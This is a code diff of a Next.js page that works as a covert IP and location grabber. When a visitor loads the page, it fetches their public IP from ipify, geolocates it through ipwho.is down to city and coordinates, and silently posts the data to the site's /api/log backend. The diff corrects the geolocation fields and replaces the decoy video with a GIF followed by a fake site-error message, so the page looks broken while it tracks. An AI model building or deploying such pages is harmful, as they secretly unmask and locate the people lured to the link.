@@ -1,33 +1,30 @@
-'use client'
-import { useEffect } from 'react';
+'use client';
+import { useEffect, useState } from 'react';
 import styles from "./page.module.css";
-import Head from 'next/head'
 
 export default function Home() {
+  const [showGif, setShowGif] = useState(true);
+
   useEffect(() => {
     async function logIPandLocation() {
-      // Obtener IP del visitante
       const ipRes = await fetch('https://api.ipify.org?format=json');
       const { ip } = await ipRes.json();
 
-      // Obtener ubicación aproximada usando la IP
       const locationRes = await fetch(`https://ipwho.is/${ip}`);
 
       const locationData = await locationRes.json();
 
-      // Datos que enviaremos al servidor
       const logData = {
         ip,
         location: {
           country: locationData.country,
-          regionName: locationData.regionName,
+          regionName: locationData.region,
           city: locationData.city,
-          lat: locationData.lat,
-          lon: locationData.lon,
+          lat: locationData.latitude,
+          lon: locationData.longitude,
         }
       };
 
-      // Guardar IP + Ubicación en tu backend
       await fetch('/api/log', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -36,21 +33,23 @@ export default function Home() {
     }
 
     logIPandLocation();
+
+    const timer = setTimeout(() => {
+      setShowGif(false);
+    }, 2000);
+
+    return () => clearTimeout(timer);
   }, []);
 
   return (
     <>
-        <div className={styles.page}>
+      <div className={styles.page}>
         <main className={styles.main}>
-          <iframe
-            width="800"
-            height="450"
-            src="https://www.youtube.com/embed/oofSnsGkops?autoplay=1&mute=1"
-            title="James Blunt - You're Beautiful"
-            frameBorder="0"
-            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
-            allowFullScreen
-          ></iframe>
+          {showGif ? (
+            <img src="/holli-would-dancing.gif" alt="Cargando..." width="214" height="240" />
+          ) : (
+            <p>Error en el sitio web</p>
+          )}
         </main>
       </div>
     </>
